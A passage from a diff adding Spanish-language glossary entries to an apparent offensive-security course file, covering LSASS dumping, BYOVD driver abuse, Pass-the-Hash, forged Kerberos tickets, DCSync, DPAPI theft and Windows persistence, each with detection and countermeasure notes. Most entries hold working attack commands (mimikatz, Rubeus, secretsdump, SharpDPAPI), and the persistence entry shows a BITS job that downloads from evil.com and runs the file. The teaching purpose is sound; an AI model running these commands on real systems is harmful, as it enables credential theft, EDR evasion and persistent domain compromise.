(PPL)** — enabled en Win 8.1+ con Credential Guard. Estos bypasses attack la protection.\n\n**Nanodump (SpecterOps):**\nDump minimal (solo Wdigest/NTLM), evade signature.\n\n**Análisis offline del dump con mimikatz:**\n```\nmimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords\n# Output: NTLM hashes, Wdigest passwords, Kerberos tickets\n```\n\n**Detección (blue team):**\n\n**LSASS access:**\n• **Sysmon Event 10** — process access to LSASS with GrantedAccess 0x1010 (dump)\n• **Defender for Endpoint** — flag directo sobre procdump/comsvcs sobre LSASS\n• **Attack Surface Reduction (ASR) rules** — 'Block credential stealing from LSASS'\n\n**Contramedidas:**\n• **LSASS as PPL** (Windows 8.1+) — Credential Guard\n• **RunAsPPL registry key** habilitado\n• **Deshabilitar WDigest** (cleartext passwords in memory) — default deshabilitado desde Win 8.1\n• **LAPS** — random local admin passwords\n• **Kerberos-only auth** (deshabilitar NTLM en dominio)\n• **Print Spooler off** en DCs post-PrintNightmare\n\n**PrintNightmare defense:**\n• Deshabilitar Print Spooler donde no se necesite\n• Point-and-Print restriction via GPO\n• Package Point and Print restrictions\n\n> 💡 En 2024, **LSASS PPL bypasses siguen apareciendo**. Defensa en profundidad (Credential Guard + LAPS + Kerberos-only) es imprescindible.\n> ⚠️ Dump de LSASS es **RED FLAG obvia** en cualquier EDR moderno. Alternativas: nanodump, PPLdump, o pivoting a otra técnica (kerberoasting, DCSync).",
+    examples: [
+      "PrintNightmare 2021: 6+ meses de bypasses sucesivos post-first-patch.",
+      "SharpDPAPI + backup key + DA hash: exfil de todas las passwords de dominio guardadas en Chrome/Outlook.",
+      "OSCP Windows AD track: procdump lsass → mimikatz sekurlsa → NTLM hashes → Pass-the-Hash.",
+    ],
+    related: ["Mimikatz y robo de credenciales", "Ataques a Active Directory", "AV/EDR evasion moderna: AMSI, ETW, syscall directas", "Meterpreter avanzado: migrate, extensions, priv escalation"],
+  },
+  {
+    id: 358,
+    module: 32,
+    term: "BYOVD y kernel exploits Windows",
+    short: "Vulnerable drivers signed by Microsoft-approved vendors permiten kernel-mode code execution. Bypass total de EDR user-mode.",
+    detail:
+      "**BYOVD** (*Bring Your Own Vulnerable Driver*) es la técnica moderna para bypass total de EDR: cargar un driver **legítimamente firmado** pero vulnerable, y usar sus bugs para kernel-mode operations.\n" +
+      "\n**Por qué funciona:**\nWindows requiere que kernel drivers estén firmados (Driver Signature Enforcement, DSE). Microsoft mantiene una **allowlist implícita** — cualquier driver firmado por un cert válido puede cargarse.\n" +
+      "\nMuchos vendors legítimos (Intel, Nvidia, ASUS, MSI) publicaron drivers con bugs de kernel security. Aunque el driver sea vulnerable, sigue estando firmado. El atacante lo carga y explota sus bugs.\n" +
+      "\n**Drivers famosos abusables:**\n\n**gmer.sys, procexp.sys:**\nAnti-rootkit tools que exponen APIs para leer/escribir kernel memory. Abusables como primitives.\n\n**iqvw64e.sys (Intel Ethernet):**\nBugs de kernel memory access. Cargable en cualquier Windows con Intel drivers.\n\n**RTCore64.sys (MSI Afterburner):**\nDMA ilimitado a physical memory. Usado en ~40% de public BYOVD tools.\n\n**gdrv.sys (Gigabyte):**\nR/W physical memory sin auth. CVE-2018-19320.\n\n**wnbios.sys (Winring0):**\nOverclock utility. R/W CPU MSRs (Model Specific Registers) → total control.\n\n**Y muchos más** — repositorio 'loldrivers.io' cataloga 350+ drivers vulnerables conocidos.\n\n**Herramientas de exploitation:**\n\n**KDMapper (2020):**\n```\nKDMapper.exe payload.sys\n# Carga arbitrary unsigned driver usando iqvw64e.sys como primitive\n```\nMap driver sin firma a kernel memory abusando el vuln driver.\n\n**EDRSandBlast (2022):**\nUsa un vuln driver para:\n• Unhook EDR ntoskrnl callbacks\n• Disable EDR kernel notifications\n• Restore original SSDT (System Service Descriptor Table)\n• Kill EDR process from kernel-mode\n\n```\nEDRSandBlast.exe -v --usermode --kernelmode\n```\n\n**BadZure:**\nSimilar, PowerShell-based. Fácil de usar en post-compromise.\n\n**KaramamonoZubie / DriveByFail:**\nAlternativas focused en specific drivers.\n\n**PPLBlade:**\nUsa vuln driver para bypass LSASS PPL protection → dump credentials.\n\n**Casos observados en la wild:**\n\n**BlackByte ransomware (2022):**\nUsó RTCore64.sys para disable EDR pre-encryption.\n\n**AvosLocker (2022):**\nDeploy driver GMER firmado para kill AV/EDR products.\n\n**Cuba ransomware (2023):**\nDrivers Avast (leaked cert!) para bypass endpoint protection.\n\n**North Korean Lazarus (2023):**\nBYOVD específico para wipe forensic tools.\n\n**Windows Driver Blocklist:**\nMicrosoft mantiene una **blocklist policy** (Microsoft Recommended Driver Block Rules). Enable con Windows Defender Application Control (WDAC) o `HVCI` (Hypervisor-protected Code Integrity):\n```powershell\n# Habilitar el blocklist\nSet-CIPolicySetting -Enable ... -Policy $blockRulesPath\n```\n\n**Bypass de blocklist:**\nAttackers publican nuevos drivers vulnerables descubiertos cada mes. Blocklist tiene lag (updates cada 6-12 meses en releases mayores). **En 2024, ~200 drivers en blocklist official pero 350+ conocidos.**\n\n**Otros vectors kernel exploitation:**\n\n**HackSysExtreme Vulnerable Driver (HEVD):**\nDriver INTENTIONALLY vulnerable, para practice. Excelente para aprender kernel exploitation.\n\n**Windows kernel CVEs modernas:**\n• **CVE-2022-26925 (LSA spoofing)** — coerción de auth\n• **CVE-2023-28252 (CLFS driver)** — LPE\n• **CVE-2023-29336 (Win32k)** — LPE\n\n**Contramedidas:**\n• **HVCI enabled** — separates kernel VA space from EDR memory\n• **Microsoft Vulnerable Driver Blocklist** habilitada\n• **WDAC (Application Control)** — allowlist of allowed drivers\n• **Attack Surface Reduction (ASR) rules** — 'Block abuse of exploited vulnerable signed drivers'\n• **Update blocklist regularly** — no confiar en la default\n• **EDR con kernel driver awareness** — CrowdStrike/SentinelOne cross-check contra loldrivers.io\n\n> 💡 En 2024 BYOVD es **standard technique** en red team engagements sofisticados y ransomware ops.\n> ⚠️ Loading unsigned drivers requiere **admin privileges** — no es privesc por sí, es **defense evasion post-privesc**.",
+    examples: [
+      "loldrivers.io: catálogo community de 350+ vulnerable drivers.",
+      "EDRSandBlast (Wavestone): open source demonstration de la técnica.",
+      "Cuba ransomware 2023: Avast cert leak → deploy driver Avast firmado (legítimo, no patched) → kill AV.",
+    ],
+    related: ["AV/EDR evasion moderna: AMSI, ETW, syscall directas", "Sliver, Havoc y C2 modernos (post-Cobalt Strike)", "Mimikatz y robo de credenciales", "Meterpreter avanzado: migrate, extensions, priv escalation"],
   },
 
   // ── M33 · Pivoting y Movimiento Lateral ──────────────────────────────────
@@ -4403,6 +4914,81 @@ export const DEFINITIONS: ConceptDefinition[] = [
       "LAPS para que cada equipo tenga una contraseña local distinta.",
     ],
     related: ["Movimiento lateral", "Defensa en profundidad", "DMZ y segmentación de red"],
+  },
+  {
+    id: 364,
+    module: 33,
+    term: "Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash",
+    short: "Reutilizar hashes NTLM y tickets Kerberos capturados sin necesitar el password cleartext. La base del lateral movement en AD.",
+    detail:
+      "Tras capturar credentials en LSASS o SAM, hay 3 técnicas core para reutilizarlas — sin necesitar el password cleartext.\n" +
+      "\n**Pass-the-Hash (PtH, Hernan Ochoa 1997):**\n\nEl NTLM auth protocol usa el hash NTLM del password como shared secret. Si capturamos el hash, podemos autenticarnos con él directamente — no necesitamos el password cleartext.\n\n```bash\n# Impacket (Linux)\npsexec.py -hashes aad3b435...31d6cfe0d16ae931b73c59d7e0c089c0 CORP.LOCAL/admin@target\npsexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP.LOCAL/admin@target  # solo NT hash\nwmiexec.py -hashes ... admin@target                                        # stealth via WMI\nsmbexec.py -hashes ... admin@target                                        # con SMB service\n\n# NetExec (batch)\nnxc smb 192.168.1.0/24 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth\n\n# Windows post-mimikatz\nmimikatz # sekurlsa::pth /user:admin /domain:corp /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0\n# Spawns cmd.exe con auth as admin — netauth aparece como el domain admin\n```\n\n**PtH funciona solo con NTLM auth** — servicios que lo aceptan (SMB, WMI, WinRM, MSSQL con Windows Auth, RDP con Restricted Admin mode).\n\n**Kerberos-only environments** (deshabilitando NTLM) matan PtH.\n\n**Pass-the-Ticket (PtT):**\n\nSi capturamos tickets Kerberos (TGT o TGS) en memoria de otro user, podemos importarlos y autenticarnos como ese user.\n\n```bash\n# Extraer tickets con mimikatz\nmimikatz # sekurlsa::tickets /export\n# Guarda .kirbi files en el directorio\n\n# Windows: import ticket para uso subsecuente\nmimikatz # kerberos::ptt admin.kirbi\nklist   # verificar\ndir \\\\dc.corp.local\\C$   # accede como el user del ticket\n\n# Linux: convertir .kirbi a .ccache + KRB5CCNAME\ncat admin.kirbi | base64 -w 0 > admin.b64\nticketConverter.py admin.kirbi admin.ccache\nexport KRB5CCNAME=admin.ccache\npsexec.py -k -no-pass CORP.LOCAL/admin@target\n```\n\n**Overpass-the-Hash (OPtH, Skip Duckwall + Benjamin Delpy 2014):**\n\nHybrid technique — con el NTLM hash **request nuevos Kerberos tickets** (en vez de usar NTLM directamente). Blend con Kerberos-only environments.\n\n```bash\n# Impacket (Linux)\ngetTGT.py -hashes ...:31d6cfe0d16ae931b73c59d7e0c089c0 CORP.LOCAL/admin@dc.corp.local\n# Genera TGT en .ccache\nexport KRB5CCNAME=admin.ccache\npsexec.py -k -no-pass CORP.LOCAL/admin@target\n\n# Rubeus (Windows)\nRubeus.exe asktgt /user:admin /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt\n```\n\n**Ventaja OPtH vs PtH:**\n• Uses Kerberos → no aparece como NTLM auth event (menos flags en SIEM)\n• Works even si NTLM está deshabilitado\n• Aparece como legitimate authentication activity\n\n**Herramientas modernas:**\n\n**Rubeus (SpecterOps):**\nEl swiss-army knife de Kerberos post-2018. Ticket manipulation, S4U attacks, golden/silver ticket, kerberoasting.\n```\nRubeus.exe asktgt /user:X /password:Y /ptt\nRubeus.exe tgtdeleg           # extrae TGT de la sesión\nRubeus.exe ptt /ticket:base64...\nRubeus.exe s4u /impersonateuser:admin /msdsspn:CIFS/target ...   # S4U ticket forge\n```\n\n**Impacket** — el equivalente Linux/Python:\n```\ngetTGT.py, getST.py, ticketer.py (silver/golden), findDelegation.py\n```\n\n**Detection (blue team):**\n\n• **Event 4624 con Logon Type 3 (network) + LogonProcess NtLmSsp**: PtH típico.\n• **Kerberos tickets con RC4** encryption (Kerberoasting o OPtH signal).\n• **Cross-domain ticket flags** anómalos.\n• **CrowdStrike/SentinelOne** detect memory access patterns de mimikatz.\n\n**Contramedidas:**\n• **Deshabilitar NTLM** en el dominio (o restringir en DCs)\n• **Kerberos AES-only** — RC4 deshabilitado\n• **Credential Guard** — protege LSASS de dump con VBS/Hyper-V isolation\n• **LAPS** — passwords locales random rotated → un hash comprometido no reutilizable en otros hosts\n• **Protected Users group** — negá NTLM para users en este grupo, TGT lifetime shorter\n• **Restricted Admin Mode** en RDP — evita transmitir hash/password al target\n> 💡 En un pentest AD moderno, **OPtH + Rubeus asktgt** es la técnica canonical post-mimikatz.\n> ⚠️ PtH plain es **muy detectado en 2024** por EDR/SIEM. OPtH es más stealth.",
+    examples: [
+      "OSCP AD track: mimikatz sekurlsa → NTLM hash → PtH con nxc a través del dominio.",
+      "APTs y ransomware: PtH es #1 technique post-domain-admin compromise (Trickbot, Ryuk, Conti).",
+      "Impacket psexec.py + hash: quick shell as admin en cualquier Windows target.",
+    ],
+    related: ["Ataques a Active Directory", "Movimiento lateral", "PowerShell ofensivo", "Kerberoasting y AS-REP roasting"],
+  },
+  {
+    id: 365,
+    module: 33,
+    term: "Silver, Golden, Diamond y Sapphire tickets",
+    short: "Forge de tickets Kerberos con hashes de service account (silver) o krbtgt (golden/diamond/sapphire). Persistencia + acceso arbitrario.",
+    detail:
+      "Kerberos usa 2 tipos de tickets: **TGT** (Ticket Granting Ticket, obtenido al login) y **TGS** (Ticket Granting Service, per-service). Ambos son firmados por el KDC. Si un atacante obtiene la clave que firma los tickets, puede **forge tickets arbitrarios**.\n" +
+      "\n**Silver Ticket (Benjamin Delpy 2014):**\n\nForge TGS para un servicio específico usando **el hash NTLM del service account** de ese servicio.\n\n**Impact:**\n• Acceso a UN servicio específico (CIFS de un file server, HTTP de un IIS, MSSQL de un DB, etc.).\n• Sin contactar al DC → **no aparece en logs del DC** (más stealth).\n• Requiere solo el hash del service account (Kerberoasteable → PtH).\n\n**Generación con Rubeus:**\n```\nRubeus.exe silver /service:CIFS/fileserver.corp.local /rc4:HASH_NTLM_SERVICE_ACCT /user:AttackerName /domain:corp.local /sid:S-1-5-21-... /ptt\n```\n\n**Impacket:**\n```bash\nticketer.py -spn CIFS/fileserver.corp.local -nthash HASH_NTLM_SERVICE_ACCT -domain-sid S-1-5-21-... -domain CORP.LOCAL AttackerName\n# Genera AttackerName.ccache\nexport KRB5CCNAME=AttackerName.ccache\nsmbclient.py CORP.LOCAL/AttackerName@fileserver.corp.local\n```\n\n**Golden Ticket (Delpy 2014):**\n\nForge TGT usando **el hash del `krbtgt` account** — la cuenta que firma TODOS los TGTs del dominio. Con krbtgt hash, control total.\n\n**Impact:**\n• Puede pedir TGS para cualquier servicio de cualquier user\n• Ticket lifetime configurable (default max 10 años!)\n• **Persistencia perfecta** — mientras el krbtgt no rote, el ticket funciona\n• krbtgt password nunca se rota automáticamente (a menos que un DA lo haga explícitamente)\n\n**Obtener krbtgt hash:**\n• DCSync (requires DA privileges — replicating directory changes)\n• Dump NTDS.dit (requires DA + physical access to DC o backup DIT)\n\n```bash\n# DCSync con impacket\nsecretsdump.py CORP.LOCAL/DA_user:password@dc.corp.local -just-dc-user krbtgt\n\n# mimikatz on DC\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\n```\n\n**Forge:**\n```\n# Rubeus\nRubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH_KRBTGT /ptt\n\n# Impacket\nticketer.py -nthash HASH_KRBTGT -domain-sid S-1-5-21-... -domain CORP.LOCAL Administrator\n# Genera Administrator.ccache válido\n\n# mimikatz\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt\n```\n\n**Diamond Ticket (SpecterOps, 2022):**\n\nAvance sobre Golden — en vez de crear TGT desde cero (que puede ser detectado por anomalías en flags/lifetime), **modificar un TGT legítimo** conservando su estructura y solo agregando arbitrary group memberships. **Mucho más stealth** contra detection avanzada.\n\n```\nRubeus.exe diamond /ticket:legit_tgt.kirbi /user:Administrator /groups:512,516,519 /ptt\n```\n\n**Sapphire Ticket (nuevo 2023):**\n\nEvolution: forge un TGT que apunta a un user existente con groups **inheriting** legítimos. Combina Diamond con S4U for even more stealth.\n\n**Detection:**\n\n**Golden Ticket detection:**\n• Kerberos tickets con **lifetime anómalo** (>10 horas o >10 años).\n• TGTs con **encryption RC4** cuando el dominio usa AES.\n• Users con SIDs **ausentes o mal formateados**.\n• Windows Event 4769 (TGS request) con user \"no existe\" que sin embargo obtiene TGS.\n\n**Silver Ticket:**\n• Sin logs en DC (bypasses)\n• PAC validation por parte del servicio — si el servicio hace `KRB_TICKET_LOGON` extended check con el DC, el ticket falso falla.\n\n**Contramedidas:**\n\n**Preventive:**\n• **Rotar krbtgt password 2 veces** (con `Reset-KrbtgtKeys.ps1`) — invalida todos los golden tickets outstanding.\n• **Automated krbtgt rotation** cada 6-12 meses.\n• **AES-only Kerberos** — dificulta forge (aunque no imposible).\n• **Protected Users group** para high-value accounts.\n\n**Detective:**\n• **Sysmon Event 4769/4624** con anomaly detection sobre TGT lifetime.\n• **BloodHound** para identify accounts con permisos DCSync.\n\n**S4U Attacks (Rubeus asktgs):**\n\nS4U2Self + S4U2Proxy — abuse de Kerberos delegation:\n```\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/target /user:MachineAcct$ /rc4:HASH /ptt\n```\nCon control de la machine account de una computer que tenga **Constrained Delegation** → impersonate cualquier user contra services delegated.\n\n> 💡 **Golden Ticket** es la técnica de persistencia post-domain-compromise más impactante. Un red team con DA hash y no rotate = acceso durante meses.\n> ⚠️ **Diamond > Golden** en engagement con blue team maduro. Golden es DETECTED por reglas conocidas.",
+    examples: [
+      "APT29 (Cozy Bear, 2020): Golden Tickets como persistencia en SolarWinds compromise victims.",
+      "Colonial Pipeline (2021 initial vector): DA compromise + Silver Ticket para file server access.",
+      "SpecterOps Diamond Ticket paper: technique disclosed publicly en 2022.",
+    ],
+    related: ["Kerberoasting y AS-REP roasting", "Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash", "Ataques a Active Directory", "LDAP enumeration y BloodHound"],
+  },
+  {
+    id: 366,
+    module: 33,
+    term: "DCSync, DCShadow y DPAPI dumping",
+    short: "DCSync replica NTDS.dit remoto (dump all creds). DCShadow crea DC falso (persistencia total). DPAPI recover credentials cifradas.",
+    detail:
+      "Tres técnicas para robar credentials post-compromise en AD. Requieren distintos privilege levels pero todos son 'game over' cuando funcionan.\n" +
+      "\n**DCSync (Delpy + Le Toux, 2015):**\n\nAbuse de la **replicación normal de Active Directory**. Cualquier user con \"Replicating Directory Changes\" y \"Replicating Directory Changes All\" permissions puede pedir a un DC que le mande cualquier user's password data — como si fuera otro DC replicating.\n\n**Por defecto tienen esos permisos:**\n• Domain Admins, Enterprise Admins, Administrators\n• Domain Controllers\n• Users manualmente delegados (raro)\n\n**Attack:**\n```bash\n# Con impacket (secretsdump)\nsecretsdump.py CORP.LOCAL/DAuser:password@dc.corp.local\n# Output: NTLM hashes de TODOS los users del dominio + krbtgt\n\n# Específico un user\nsecretsdump.py CORP.LOCAL/DAuser:password@dc.corp.local -just-dc-user krbtgt\nsecretsdump.py CORP.LOCAL/DAuser:password@dc.corp.local -just-dc-user administrator\n\n# Con mimikatz on Windows\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\nmimikatz # lsadump::dcsync /domain:corp.local /all /csv\n```\n\n**Impact:**\n• krbtgt hash → Golden Tickets\n• Domain Admin passwords → cualquier acceso\n• Historic password hashes → cracks + reuse patterns\n\n**DCShadow (Delpy + Le Toux, 2018):**\n\nMás avanzado. En vez de solicitar data del DC, **el atacante registra su máquina como un DC falso** en el bosque, hace cambios (agregar SID history, cambiar group memberships), y replica al DC real.\n\n**Impact:**\n• **Persistencia extrema** — cambios como si fueran replicación normal, sin logs anómalos\n• Agregar SID de \"Enterprise Admins\" a un user regular sin dispersar credenciales\n• Difícil de detectar (blue team asume replication events son legit)\n\n```powershell\n# mimikatz # lsadump::dcshadow\n# Requiere DA privilege temporary + reg mods\n```\n\nComplicado en modo defensive setups. Requires Domain Admin equivalent inicialmente. **Uso primario: red team ops con persistencia largo plazo**.\n\n**DPAPI dumping (con backup key):**\n\n**DPAPI Master Keys** están cifrados con user password hash. Pero AD también genera **domain backup keys** (RSA) — copia de escape del DA para recuperar files cifrados de users que perdieron el password.\n\nCon domain backup key + acceso a filesystem del user, se puede decrypt DPAPI blobs de TODOS los users del dominio.\n\n```bash\n# 1. Extract domain backup key (requires DA)\nSharpDPAPI.exe backupkey /server:dc.corp.local /pvk:backupkey.pvk\n\n# 2. Enumerate + decrypt DPAPI blobs de todos los users\nSharpDPAPI.exe triage /pvk:backupkey.pvk\n\n# 3. Decrypt browser saved credentials\nSharpChrome.exe logins /pvk:backupkey.pvk\n\n# 4. WiFi passwords\nSharpDPAPI.exe wifi /pvk:backupkey.pvk\n```\n\n**Trove typical:**\n• Chrome/Edge saved passwords → cred stuffing\n• Outlook profiles → email access\n• PuTTY sessions → SSH targets\n• WinSCP → server access\n• Windows Credential Manager → RDP saved, Git creds, etc.\n\n**NTDS.dit offline dump:**\n\nSi tenés acceso físico o backup del DC:\n```bash\n# From Windows DC directly\nntdsutil \"ac in ntds\" \"ifm\" \"create full C:\\temp\" q q\n# Copies ntds.dit + SYSTEM registry hive\n\n# Parse offline (Linux)\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL\n```\n\n**Detection:**\n\n**DCSync detection:**\n• **Event 4662** en DCs con Access Mask 0x00000100 (DS-Replication-Get-Changes)\n• **DirectoryReplicationOperations** anómalos desde IPs que no son DCs\n• **Sysmon** en cliente detecta secretsdump/mimikatz process patterns\n\n**DCShadow detection:**\n• Cambios de replication con **serverGUID no reconocido** en el forest\n• **nTDSDSA** entries anómalos\n• **Delegated Access Rights** modifications inesperados\n\n**Contramedidas:**\n• **Least privilege** en \"Replicating Directory Changes\" — solo DCs y accounts críticos\n• **Auditing 4662** habilitado con alerting sobre Replicating access\n• **Tier 0 asset protection** — DCs en zone aislada, monitoring especializado\n• **JIT (Just-in-time) privileges** para DA accounts\n• **PAM (Privileged Access Management)** — DA passwords rotan por request, session recording\n> 💡 **DCSync es la técnica #1 para dump credenciales del dominio**. Todo pentest AD moderno la usa post-DA.\n> ⚠️ **NTDS.dit backup en unprotected share** es hallazgo común — busca `\\\\backup-server\\backups\\*ntds*`.",
+    examples: [
+      "Ryuk / Conti ransomware: DCSync como paso obligatorio pre-encryption for maximum leverage.",
+      "SharpDPAPI + backup key = extract todas las Chrome passwords guardadas de todos los employees.",
+      "APT38 (North Korea): DCShadow para persistir en SWIFT-linked institutions.",
+    ],
+    related: ["Ataques a Active Directory", "Silver, Golden, Diamond y Sapphire tickets", "Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash", "PrintNightmare, DPAPI y LSASS dumping"],
+  },
+  {
+    id: 367,
+    module: 33,
+    term: "Persistence techniques modernas (Windows)",
+    short: "Scheduled Tasks abusables, WMI subscriptions, DLL sideloading, COM hijacking. MITRE ATT&CK TA0003 completo.",
+    detail:
+      "**Persistence** es cómo el atacante mantiene acceso al target aunque reboot, logout, o password change. MITRE ATT&CK Tactic **TA0003** cataloga ~20 técnicas primary. Las más usadas en 2024:\n" +
+      "\n**Scheduled Tasks (T1053.005):**\nCorren a intervalos o eventos. Múltiples ways de create:\n```powershell\n# schtasks (built-in, forensically visible)\nschtasks /create /tn Updater /tr 'powershell -w hidden -e BASE64PAYLOAD' /sc minute /mo 10\n\n# PowerShell native (más stealth)\n$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -File C:\\evil.ps1'\n$trigger = New-ScheduledTaskTrigger -AtLogon\nRegister-ScheduledTask -TaskName 'Updater' -Action $action -Trigger $trigger -User 'SYSTEM'\n```\n\n**Detección:**\n• Sysmon Event 106 (SchTasks creation)\n• Registry writes en `HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache`\n\n**GhostTask (2023):**\nBypass logging de scheduled tasks — direct registry write to TaskCache sin API calls trackeadas.\n\n**Registry Run keys (T1547.001):**\nEjecuta al login del user.\n```powershell\n# HKCU (per-user) o HKLM (system)\nSet-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\evil.exe'\n```\nLocations: `Run`, `RunOnce`, `RunOnceEx`, `RunServices`, `Winlogon\\Userinit`, `Winlogon\\Shell`.\n\n**WMI Event Subscriptions (T1546.003):**\nSetup un WMI event filter + consumer que dispara payload al ocurrir evento del sistema (login, network change, process spawn).\n```powershell\n# Persistencia via WMI (sin file en disk, muy stealth)\n$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n    Name = 'Updater'; EventNamespace = 'root\\cimv2'; QueryLanguage = 'WQL';\n    Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_Process\"'\n}\n$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n    Name = 'Updater'; CommandLineTemplate = 'C:\\evil.exe'\n}\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}\n```\n**Fileless persistence** — el 'file' vive en el WMI repository, no en NTFS.\n\n**COM Hijacking (T1546.015):**\nColocar DLL malicioso donde una COM class se registra pero no exists. Cuando app carga la COM → runs tu DLL.\n\n**DLL Sideloading (T1574.002):**\nUn app legit carga una DLL desde su directorio o PATH. Colocar tu DLL con el nombre esperado.\n\n**Casos famosos:**\n• Legítimo binary de Microsoft carga `dwrite.dll` desde su directorio\n• Renombrar tu payload → `dwrite.dll` + colocar junto al binary\n• Al ejecutar → tu DLL runs con la firma/reputation del legit binary\n\n**Ejemplos reales:**\n• **APT41 (2020)** — sideloading en múltiples samples\n• **BlackByte** — CobaltStrike sideloaded en app legit\n\n**Services (T1543.003):**\nCrear service que corre como SYSTEM al boot.\n```powershell\nNew-Service -Name Updater -BinaryPathName 'C:\\evil.exe' -StartupType Automatic\nStart-Service Updater\n```\n\n**AlwaysInstallElevated** — MSI que corre con full privileges si registry keys set. Persistence via MSI package.\n\n**Startup folder:**\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n```\nDrop LNK/EXE — runs al login.\n\n**BITS Jobs (T1197):**\nBackground Intelligent Transfer Service — usado para Windows Updates. Se puede abusar:\n```powershell\nbitsadmin /create updater\nbitsadmin /addfile updater http://evil.com/x C:\\evil.exe\nbitsadmin /SetNotifyCmdLine updater C:\\evil.exe NULL\n```\nEl file se downloads + runs quietly.\n\n**DSRM Password (T1003.003):**\n**Directory Services Restore Mode** admin password on DCs — often set to same as first DA password ever. Backdoor histórico.\n\n**Certificate persistence (T1649):**\n**Golden Certificate** — con acceso a AD CS (Certificate Services) private key, forge certificates for any user. Persistente indefinidamente. Vector primario de \"Certified Pre-Owned\" (SpecterOps 2021).\n\n**Skeleton Key (T1556):**\nInyectar backdoor password en LSASS de un DC. Cualquier user puede autenticarse con el skeleton password + su propio hash. Muere al reboot del DC.\n```\nmimikatz # misc::skeleton\n# Password universal: mimikatz\n```\n\n**Detection general:**\n• **Sysmon Event 12/13/14** — Registry monitoring\n• **Sysmon Event 19/20/21** — WMI Event Filter creation\n• **Sysmon Event 1** — process creation con parent unusual (rundll32 sin args normales)\n• **AutoRuns from Sysinternals** — enumera 200+ locations de auto-start\n• **THOR / Loki** — YARA scanners para malware persistence patterns\n\n**Contramedidas:**\n• **AppLocker/WDAC** — allowlist ejecutables\n• **Audit persistence changes** con Sysmon config comprehensive (Olaf Hartong's config)\n• **Endpoint Detection & Response** — behavioral analysis\n• **Regular AutoRuns audit** — schedule for periodic review\n> 💡 **WMI Event Subscriptions** siguen siendo underdetected — muchas ops de threat hunting no los cubren.\n> ⚠️ Múltiples técnicas combinadas (Run key + WMI + scheduled task) para defense in depth de persistence — killer una no elimina el resto.",
+    examples: [
+      "APT29 SolarWinds 2020: Golden Ticket + Scheduled Task para 6+ meses de persistence.",
+      "Autoruns de Sysinternals: THE tool para revisar persistencia post-compromise investigation.",
+      "MITRE ATT&CK TA0003: 20+ subtechniques catalogadas y detectables.",
+    ],
+    related: ["Movimiento lateral", "Meterpreter avanzado: migrate, extensions, priv escalation", "PowerShell ofensivo", "AV/EDR evasion moderna: AMSI, ETW, syscall directas"],
+  },
+  {
+    id: 368,
+    module: 33,
+    term: "Cross-forest lateral: SID history, trusts, delegation",
+    short: "Constrained/Unconstrained/RBCD delegation, SID history injection, cross-forest trust abuse. Escalar más allá del primer dominio.",
+    detail:
+      "En enterprises con múltiples dominios/forests (mergers, acquisitions, subsidiarias), un compromise en un dominio puede escalar a otros vía **trust relationships**. Kerberos delegation es el mecanismo, cross-forest trusts son el vector.\n" +
+      "\n**Kerberos Delegation types:**\n\n**Unconstrained Delegation (dangerous, deprecated post-2019):**\nUn service account con este privilege puede impersonate any user que se autentique contra él. Al recibir un TGT del user, el server lo almacena en memoria — dump con mimikatz → forge tickets.\n\n**Enumerate:**\n```powershell\n# BloodHound: query 'Find computers with unconstrained delegation'\n\n# LDAP filter\n(userAccountControl:1.2.840.113556.1.4.803:=524288)\n\n# PowerView\nGet-DomainComputer -Unconstrained\n```\n\n**Exploit:** coerce a Domain Admin (o DC) a autenticarse hacia el server con delegation → dump memoria → obtener TGT del DA.\n\n**Constrained Delegation (Microsoft KerbCon, 2003):**\nService puede impersonate users **solo hacia specific services** listed en su `msDS-AllowedToDelegateTo`. Más seguro pero abusable.\n\n**Enumerate:**\n```powershell\n# BloodHound: 'Find principals with constrained delegation'\n# PowerView\nGet-DomainUser -TrustedToAuth\n```\n\n**Exploit — Rubeus S4U:**\nSi controlás service account A con constrained delegation a service HTTP/target.corp.local:\n```\nRubeus.exe s4u /user:svcaccount$ /rc4:HASH /impersonateuser:Administrator /msdsspn:HTTP/target.corp.local /ptt\n# Ahora tenés un ticket como Administrator para HTTP en target\n```\n\n**Resource-Based Constrained Delegation (RBCD, 2012):**\nLa víctima define quién puede delegar hacia ELLA (en `msDS-AllowedToActOnBehalfOfOtherIdentity`). Popular en clouds/APIs.\n\n**Abuse (Elad Shamir 2019):**\nSi controlás ANY object con SPN, y podés escribir a `msDS-AllowedToActOnBehalfOfOtherIdentity` del target, → arbitrary user impersonation.\n\n```powershell\n# 1. Add computer con SPN (default hasta MS-DS-Machine-Account-Quota=10)\n# Cualquier user puede añadir hasta 10 computers al dominio (default)\nPowermad's New-MachineAccount -MachineAccount 'attackercomp$'\n\n# 2. Modify target's msDS-AllowedToActOnBehalfOfOtherIdentity → attackercomp$\nSet-ADComputer target -PrincipalsAllowedToDelegateToAccount attackercomp$\n\n# 3. S4U attack: attackercomp$ requests TGS for target impersonating any user\nRubeus.exe s4u /user:attackercomp$ /rc4:HASH_ATTACKER /impersonateuser:Administrator 